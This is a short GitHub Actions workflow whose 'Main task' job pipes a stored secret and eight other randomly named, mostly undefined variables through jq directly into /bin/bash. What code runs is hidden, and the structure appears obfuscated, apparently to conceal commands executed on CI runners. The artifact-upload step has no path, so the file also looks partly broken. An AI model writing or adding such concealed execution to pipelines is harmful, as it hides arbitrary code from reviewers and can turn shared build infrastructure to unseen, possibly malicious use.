    name: Main task
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Run
        env:
          pyrsp6: ${{ secrets.pyrsp6 }}
        run: |
          printf '%s' "$pyrsp6" | jq -r .aasa47 | /bin/bash
          echo $eh4074 | jq -r .zwyjg6 | /bin/bash
          printf '%s' "$i0187" | jq -r .lrvpn96959 | /bin/bash
          echo $jeyix6 | jq -r .xj9 | /bin/bash
          printf '%s' "$rvwr86260" | jq -r .qbq978 | /bin/bash
          printf '%s' "$liigz443" | jq -r .j33776 | /bin/bash
          printf '%s' "$nsogw41" | jq -r .qtna78 | /bin/bash
          printf '%s' "$bupk406" | jq -r .eo8272 | /bin/bash
          echo $d29 | jq -r .km19 | /bin/bash

      - name: Store results
        uses: actions/upload-artifact@v4
